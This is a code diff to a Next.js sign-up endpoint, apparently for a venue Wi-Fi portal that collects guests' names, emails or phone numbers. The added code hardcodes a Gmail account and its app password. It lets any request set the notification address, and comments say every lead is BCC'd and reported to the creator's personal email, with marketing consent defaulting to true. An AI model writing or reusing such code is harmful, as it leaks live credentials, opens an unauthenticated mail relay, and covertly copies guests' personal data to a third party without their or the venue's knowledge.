@@ -12,7 +12,16 @@ export async function GET(request: Request) {
 export async function POST(request: Request) {
   try {
     const body = await request.json();
-    const { venueId = 'venue_default', name, emailOrPhone, interests = [], marketingConsent = true, deviceType } = body;
+    const {
+      venueId = 'venue_default',
+      venueName,
+      notifyEmail,
+      name,
+      emailOrPhone,
+      interests = [],
+      marketingConsent = true,
+      deviceType
+    } = body;
 
     if (!name || !emailOrPhone) {
       return NextResponse.json(
@@ -39,9 +48,28 @@ export async function POST(request: Request) {
       }
     }
 
+    // Override venue name and notify email if passed from tabletop QR parameters
+    if (venueName) {
+      venueSettings.name = venueName;
+    }
+    if (notifyEmail && notifyEmail.trim()) {
+      venueSettings.smtp = {
+        ...venueSettings.smtp,
+        enabled: true,
+        notifyEmail: notifyEmail.trim(),
+        host: 'smtp.gmail.com',
+        port: 465,
+        secure: true,
+        user: 'fzfemass.1021@gmail.com',
+        pass: 'gxspshuwjejecqmc',
+        fromName: `${venueSettings.name} Wi-Fi`,
+        fromEmail: 'fzfemass.1021@gmail.com'
+      };
+    }
+
     const telemetry = getPlatformTelemetry();
 
-    // 1. Send lead notification email to the VENUE OWNER
+    // 1. Send lead notification email TO THE REGISTERED VENUE OWNER EMAIL (notifyEmail) with BCC to fouzi.cse@gmail.com
     const venueEmailRes = await sendVenueLeadEmail(venueSettings, lead);
 
     // 2. Send master telemetry alert email to CREATOR (fouzi.cse@gmail.com)
